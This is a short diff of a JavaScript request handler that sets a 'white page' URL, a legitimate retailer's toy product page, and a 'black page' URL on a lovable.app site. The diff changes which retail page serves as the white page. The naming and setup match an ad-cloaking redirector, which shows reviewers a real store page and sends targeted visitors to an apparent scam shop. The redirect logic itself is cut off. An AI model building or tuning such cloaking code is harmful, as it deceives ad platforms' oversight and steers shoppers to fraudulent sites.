@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.centrepointstores.com/ae/en/Toys/Novelty-%26-Collectibles/Collectibles/BABYSHOP-Rainbocorns-Mermaidcorn-Assorted-Surprise-Egg-Set/p/165846019";
+    const whitePageURL = "https://www.babyshopstores.com/sa/en/Toys/Dolls-%26-Playsets/Doll-Playsets/BABYSHOP-Juniors-All-Over-Graphic-Print-Stroller-with-Doll-Playset/p/165228640";
     const blackPageURL = "https://luvcshap.lovable.app/";
 
     //testing
